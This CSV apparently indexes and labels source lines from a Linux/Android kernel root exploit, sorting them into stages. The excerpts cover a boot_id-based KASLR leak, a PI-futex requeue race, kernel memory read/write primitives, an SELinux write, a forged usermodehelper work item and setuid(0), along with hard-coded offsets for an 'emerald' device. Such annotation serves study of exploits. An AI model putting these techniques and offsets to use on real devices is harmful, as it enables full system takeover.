path,line,category,excerpt
src/core/slide.c,345,target_specific_layout,"pr_warning(""slide boot_id read denied errno=%d\n"", errno);"
src/core/slide.c,353,target_specific_layout,"pr_warning(""slide boot_id read failed errno=%d\n"", saved_errno);"
src/core/slide.c,373,target_specific_layout,"pr_warning(""slide short boot_id parse out=%d n=%zd\n"", out, n);"
src/core/slide.c,387,target_specific_layout,uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
src/core/slide.c,389,target_specific_layout,"pr_success(""slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n"","
src/core/slide.c,391,target_specific_layout,"pr_success(""slide boot_id-derived_stext pid=%d value=%016llx\n"","
src/core/slide.c,396,build_target,pthread_t waiter;
src/core/slide.c,397,build_target,pthread_t owner;
src/core/slide.c,398,build_target,pthread_t consumer;
src/core/slide.c,399,build_target,"SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));"
src/core/slide.c,399,orchestration,"SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));"
src/core/slide.c,400,build_target,"SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));"
src/core/slide.c,400,orchestration,"SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));"
src/core/slide.c,401,build_target,"SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));"
src/core/slide.c,401,orchestration,"SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));"
src/core/slide.c,409,pi_futex_sequence,"futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,"
src/core/slide.c,420,target_specific_layout,for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
src/core/slide.c,429,target_specific_layout,"fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));"
src/core/slide.c,430,target_specific_layout,"fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));"
src/core/target.h,47,target_specific_layout,#define SLIDE_NFULNL_LOGGER_OFF 0x024021a0ULL
src/core/target.h,48,target_specific_layout,#define SLIDE_LOGGERS_0_1_OFF 0x024020f0ULL
src/core/target.h,49,target_specific_layout,#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x026aa868ULL
src/core/target.h,50,target_specific_layout,#define SLIDE_SYSCTL_BOOTID_OFF 0x026aa868ULL
src/core/target.h,74,target_specific_layout,#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
src/core/target.h,75,target_specific_layout,#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
src/core/target.h,76,target_specific_layout,#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
src/core/target.h,77,target_specific_layout,#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
src/core/target.h,78,target_specific_layout,#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
src/core/target.h,79,target_specific_layout,#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
src/core/target.h,138,target_specific_layout,#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
src/core/target.h,139,target_specific_layout,#define STRUCT_SLAB_CACHE_OFF 0x08
src/core/target.h,140,target_specific_layout,#define STRUCT_PAGE_TYPE_OFF 0x30
src/core/target.h,191,target_specific_layout,#define SLIDE_PSELECT_WORD_SHIFT 2
src/core/target.h,192,target_specific_layout,#define SLIDE_PSELECT_NFDS 320
src/core/target.h,193,target_specific_layout,#define SLIDE_USE_SELECT 1
src/core/umh_root.c,2,target_specific_layout,"#include ""runtime_struct_offsets.h"""
src/core/umh_root.c,23,credential_or_execution_transition,struct umh_subprocess_info {
src/core/umh_root.c,36,credential_or_execution_transition,struct umh_completion {
src/core/umh_root.c,45,credential_or_execution_transition,struct umh_kernel_data {
src/core/umh_root.c,46,credential_or_execution_transition,struct umh_completion completion;
src/core/umh_root.c,54,credential_or_execution_transition,"_Static_assert(sizeof(struct umh_subprocess_info) == 112,"
src/core/umh_root.c,56,credential_or_execution_transition,"_Static_assert(sizeof(struct umh_completion) == 32,"
src/core/umh_root.c,59,credential_or_execution_transition,static int umh_read_data(
src/core/umh_root.c,61,kernel_memory_primitive,"if (pipe_phys_read_data(fd, target, data, len))"
src/core/umh_root.c,63,kernel_memory_primitive,"return kernel_read_data(fd, target, data, len) == (ssize_t)len;"
src/core/umh_root.c,66,credential_or_execution_transition,static int umh_write_data(
src/core/umh_root.c,68,kernel_memory_primitive,"if (pipe_phys_write_data(fd, target, data, len))"
src/core/umh_root.c,70,kernel_memory_primitive,"return kernel_write_data(fd, target, data, len) == (ssize_t)len;"
src/core/umh_root.c,73,credential_or_execution_transition,"static uint64_t umh_read64(int fd, uintptr_t target) {"
src/core/umh_root.c,75,credential_or_execution_transition,"umh_read_data(fd, target, &value, sizeof(value));"
src/core/umh_root.c,79,credential_or_execution_transition,"static uint32_t umh_read32(int fd, uintptr_t target) {"
src/core/umh_root.c,80,credential_or_execution_transition,"return (uint32_t)umh_read64(fd, target);"
src/core/umh_root.c,83,credential_or_execution_transition,"static int umh_write64(int fd, uintptr_t target, uint64_t value) {"
src/core/umh_root.c,84,credential_or_execution_transition,"return umh_write_data(fd, target, &value, sizeof(value));"
src/core/umh_root.c,87,credential_or_execution_transition,"static int umh_write32(int fd, uintptr_t target, uint32_t value) {"
src/core/umh_root.c,88,credential_or_execution_transition,"return umh_write_data(fd, target, &value, sizeof(value));"
src/core/umh_root.c,111,credential_or_execution_transition,int install_umh_root(int configfs_fd) {
src/core/umh_root.c,111,kernel_memory_primitive,int install_umh_root(int configfs_fd) {
src/core/umh_root.c,112,target_specific_layout,if (!active_offsets ||
src/core/umh_root.c,113,target_specific_layout,!active_offsets->off_system_unbound_wq ||
src/core/umh_root.c,114,credential_or_execution_transition,!active_offsets->off_call_usermodehelper_exec_work) {
src/core/umh_root.c,114,target_specific_layout,!active_offsets->off_call_usermodehelper_exec_work) {
src/core/umh_root.c,115,target_specific_layout,"pr_error(""umh: missing workqueue offsets in table\n"");"
src/core/umh_root.c,119,kernel_memory_primitive,int fd = configfs_fd;
src/core/umh_root.c,121,target_specific_layout,KIMAGE_TEXT_BASE + active_offsets->off_system_unbound_wq;
src/core/umh_root.c,123,credential_or_execution_transition,KIMAGE_TEXT_BASE + active_offsets->off_call_usermodehelper_exec_work;
src/core/umh_root.c,123,target_specific_layout,KIMAGE_TEXT_BASE + active_offsets->off_call_usermodehelper_exec_work;
src/core/umh_root.c,127,kernel_memory_primitive,"if (!pipe_phys_write_data(fd, selinux_addr,"
src/core/umh_root.c,134,credential_or_execution_transition,"uintptr_t wq = umh_read64(fd, wq_slot);"
src/core/umh_root.c,135,credential_or_execution_transition,"uintptr_t pwq = umh_read64(fd, wq + WQ_DFL_PWQ_OFF);"
src/core/umh_root.c,136,credential_or_execution_transition,"uintptr_t pool = umh_read64(fd, pwq + PWQ_POOL_OFF);"
src/core/umh_root.c,137,credential_or_execution_transition,"uintptr_t pwq_wq = umh_read64(fd, pwq + PWQ_WQ_OFF);"
src/core/umh_root.c,152,credential_or_execution_transition,"list_next = umh_read64(fd, worklist);"
src/core/umh_root.c,153,credential_or_execution_transition,"list_prev = umh_read64(fd, worklist + sizeof(uint64_t));"
src/core/umh_root.c,154,credential_or_execution_transition,"nr_idle = umh_read32(fd, pool + POOL_NR_IDLE_OFF);"
src/core/umh_root.c,167,credential_or_execution_transition,"uint32_t color = umh_read32(fd, pwq + PWQ_WORK_COLOR_OFF);"
src/core/umh_root.c,168,credential_or_execution_transition,"uint32_t refcnt = umh_read32(fd, pwq + PWQ_REFCNT_OFF);"
src/core/umh_root.c,169,credential_or_execution_transition,"uint32_t nr_active = umh_read32(fd, pwq + PWQ_NR_ACTIVE_OFF);"
src/core/umh_root.c,170,credential_or_execution_transition,"uint32_t max_active = umh_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF);"
src/core/umh_root.c,179,credential_or_execution_transition,uintptr_t umh_data_addr = page_base + UMH_DATA_OFF;
src/core/umh_root.c,181,credential_or_execution_transition,struct umh_kernel_data umh_data;
src/core/umh_root.c,182,credential_or_execution_transition,"memset(&umh_data, 0, sizeof(umh_data));"
src/core/umh_root.c,184,credential_or_execution_transition,"if (snprintf(umh_data.path, sizeof(umh_data.path), ""%s"","
src/core/umh_root.c,185,credential_or_execution_transition,UMH_BINARY_PATH) >= (int)sizeof(umh_data.path)) {
src/core/umh_root.c,189,credential_or_execution_transition,"snprintf(umh_data.arg, sizeof(umh_data.arg), ""%s"", ""--umh"");"
src/core/umh_root.c,190,credential_or_execution_transition,"snprintf(umh_data.uid, sizeof(umh_data.uid), ""%u"", getuid());"
src/core/umh_root.c,193,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, completion);"
src/core/umh_root.c,193,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, completion);"
src/core/umh_root.c,195,credential_or_execution_transition,"completion_addr + offsetof(struct umh_completion, next);"
src/core/umh_root.c,195,target_specific_layout,"completion_addr + offsetof(struct umh_completion, next);"
src/core/umh_root.c,197,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, path);"
src/core/umh_root.c,197,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, path);"
src/core/umh_root.c,199,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, arg);"
src/core/umh_root.c,199,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, arg);"
src/core/umh_root.c,201,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, uid);"
src/core/umh_root.c,201,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, uid);"
src/core/umh_root.c,203,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, argv);"
src/core/umh_root.c,203,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, argv);"
src/core/umh_root.c,205,credential_or_execution_transition,"umh_data_addr + offsetof(struct umh_kernel_data, envp);"
src/core/umh_root.c,205,target_specific_layout,"umh_data_addr + offsetof(struct umh_kernel_data, envp);"
src/core/umh_root.c,207,credential_or_execution_transition,umh_data.completion.next = wait_list_addr;
src/core/umh_root.c,208,credential_or_execution_transition,umh_data.completion.prev = wait_list_addr;
src/core/umh_root.c,210,credential_or_execution_transition,umh_data.argv[0] = path_addr;
src/core/umh_root.c,211,credential_or_execution_transition,umh_data.argv[1] = arg_addr;
src/core/umh_root.c,212,credential_or_execution_transition,umh_data.argv[2] = uid_addr;
src/core/umh_root.c,213,credential_or_execution_transition,umh_data.argv[3] = 0;
src/core/umh_root.c,214,credential_or_execution_transition,umh_data.envp[0] = 0;
src/core/umh_root.c,216,credential_or_execution_transition,uint64_t umh_work_func = text_addr(exec_work_image);
src/core/umh_root.c,219,credential_or_execution_transition,"uint32_t nr_inflight = umh_read32(fd, inflight_addr);"
src/core/umh_root.c,223,credential_or_execution_transition,struct umh_subprocess_info fake;
src/core/umh_root.c,229,credential_or_execution_transition,"memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func, sizeof(umh_work_func));"
src/core/umh_root.c,235,credential_or_execution_transition,int data_ok = umh_write_data(
src/core/umh_root.c,236,credential_or_execution_transition,"fd, umh_data_addr, &umh_data, sizeof(umh_data));"
src/core/umh_root.c,237,credential_or_execution_transition,int work_ok = umh_write_data(
src/core/umh_root.c,241,credential_or_execution_transition,"umh_write32(fd, inflight_addr, nr_inflight + 1) &&"
src/core/umh_root.c,242,credential_or_execution_transition,"umh_write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1) &&"
src/core/umh_root.c,243,credential_or_execution_transition,"umh_write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);"
src/core/umh_root.c,245,credential_or_execution_transition,int lp_ok = umh_write64(
src/core/umh_root.c,247,credential_or_execution_transition,"int ln_ok = lp_ok && umh_write64(fd, worklist, fake_entry);"
src/core/umh_root.c,265,credential_or_execution_transition,"complete_done = umh_read32(fd, completion_addr);"
src/core/umh_root.c,272,credential_or_execution_transition,int32_t umh_retval = (int32_t)umh_read32(
src/core/umh_root.c,273,credential_or_execution_transition,"fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval));"
src/core/umh_root.c,273,target_specific_layout,"fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval));"
src/core/umh_root.c,276,credential_or_execution_transition,"wake_ok, complete_done, umh_retval);"
src/core/umh_root.c,282,credential_or_execution_transition,if (umh_retval != 0) {
src/core/umh_root.c,283,credential_or_execution_transition,"pr_error(""umh: kernel exec failed retval=%d\n"", umh_retval);"
src/core/umh_root.c,288,credential_or_execution_transition,root_uid_after = 0;
src/core/umh_root.c,292,credential_or_execution_transition,"void handle_umh_mode(int argc, char **argv) {"
src/core/umh_root.c,298,credential_or_execution_transition,setuid(0);
src/devices/emerald/offsets.h,2,target_specific_layout,".kernel_phys_load=0x40000000, .phys_offset=0x40000000, STRUCT_OFFSETS_6_12,"
src/devices/emerald/offsets.h,10,orchestration,".off_ashmem_mmap=0x00D808EC, .off_ashmem_open=0x00D80948,"
src/devices/emerald/offsets.h,12,kernel_memory_primitive,".off_configfs_read_iter=0x005127F0, .off_configfs_bin_write_iter=0x00512A24,"
src/devices/emerald/offsets.h,16,target_specific_layout,".off_slide_boot_id=0x02699868,"
src/devices/emerald/offsets.h,18,credential_or_execution_transition,".off_system_unbound_wq=0x01839250, .off_call_usermodehelper_exec_work=0x000F7E74,"
src/devices/offsets.h,6,target_specific_layout,struct kernel_offsets {
src/devices/offsets.h,9,target_specific_layout,uint64_t kernel_phys_load;
src/devices/offsets.h,11,target_specific_layout,uint64_t phys_offset;
src/devices/offsets.h,16,orchestration,"uint64_t off_ashmem_ioctl, off_ashmem_compat_ioctl, off_ashmem_mmap;"
src/devices/offsets.h,18,kernel_memory_primitive,"uint64_t off_configfs_read_iter, off_configfs_bin_write_iter;"
src/devices/offsets.h,20,target_specific_layout,"uint64_t off_slide_nfulnl_logger, off_slide_loggers_0_1, off_slide_boot_id;"
src/devices/offsets.h,23,credential_or_execution_transition,uint64_t off_call_usermodehelper_exec_work;
src/devices/offsets.h,52,target_specific_layout,static const struct kernel_offsets known_offsets[] = {
src/devices/offsets.h,54,target_specific_layout,"#include ""emerald/offsets.h"""
